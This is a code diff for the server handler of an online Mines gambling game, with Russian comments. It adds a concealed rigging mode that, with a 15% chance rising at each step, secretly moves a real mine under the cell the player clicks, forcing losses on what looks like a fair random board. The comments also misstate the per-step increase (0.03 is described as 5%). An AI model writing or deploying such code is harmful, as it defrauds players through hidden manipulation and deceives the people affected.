@@ -512,20 +512,42 @@ async def mines_click(request):
         if cell in clicked:
             return web.json_response({'success': False, 'error': 'Ячейка уже открыта'})
 
-        # АНТИ-МИНУС ЛОГИКА
+        # --- НАСТРОЙКИ СУРОВОСТИ (ПОДКРУТКИ) ---
+        # Можешь менять эти значения под свою экономику
+        BASE_SCAM_CHANCE = 0.15  # 15% шанс принудительного слива на ПЕРВОМ же клике
+        STEP_SCAM_CHANCE = 0.03  # +5% к шансу слива за каждый следующий открытый кристалл
+
+        # АНТИ-МИНУС И ПОДКРУТКА
         if cell not in mines_pos:
             coefs = MINES_COEFS.get(game.bombs, [])
-            next_win = int(game.bet * coefs[game.step])
+            # Защита от выхода за пределы массива коэффициентов
+            safe_step = min(game.step, len(coefs) - 1)
+            next_win = int(game.bet * coefs[safe_step])
             
-            # Если выигрыш превышает кассу проекта -> принудительный слив
+            force_lose = False
+            
+            # 1. Классический анти-минус (защита кассы)
             if (next_win - game.bet) > MINES_BANK:
-                # Перемещаем мину в кликнутую ячейку
-                empty_cells = [c for c in range(25) if c not in clicked and c not in mines_pos and c != cell]
-                if empty_cells:
-                    mines_pos.remove(random.choice(mines_pos)) # Убираем одну случайную мину
-                    mines_pos.append(cell) # Ставим её туда, куда кликнул юзер
-                    game.mines_positions = json.dumps(mines_pos)
+                force_lose = True
+            
+            # 2. Жесткая подкрутка (казино-режим)
+            else:
+                # Вычисляем текущий шанс слива. 
+                # Например, на 3-м шаге шанс будет: 15% + (3 * 5%) = 30% шанса взорваться на пустом месте!
+                current_scam_chance = BASE_SCAM_CHANCE + (game.step * STEP_SCAM_CHANCE)
+                
+                # Кидаем "кубик" от 0.0 до 1.0
+                if random.random() < current_scam_chance:
+                    force_lose = True
 
+            # Если сервер решил слить игрока — незаметно перемещаем мину в кликнутую ячейку
+            if force_lose and mines_pos:
+                mine_to_remove = random.choice(mines_pos) # Берем случайную настоящую мину
+                mines_pos.remove(mine_to_remove)          # Убираем её со старого места
+                mines_pos.append(cell)                    # Кладем прямо под палец игроку
+                game.mines_positions = json.dumps(mines_pos)
+
+        # Добавляем ячейку в открытые
         clicked.append(cell)
         game.clicked_positions = json.dumps(clicked)
 
@@ -539,7 +561,8 @@ async def mines_click(request):
             # УСПЕХ!
             game.step += 1
             coefs = MINES_COEFS.get(game.bombs, [])
-            game.win_amount = int(game.bet * coefs[game.step - 1])
+            safe_step = min(game.step - 1, len(coefs) - 1)
+            game.win_amount = int(game.bet * coefs[safe_step])
             await session.commit()
             return web.json_response({'success': True, 'status': 'continue', 'win_amount': game.win_amount, 'step': game.step})
 
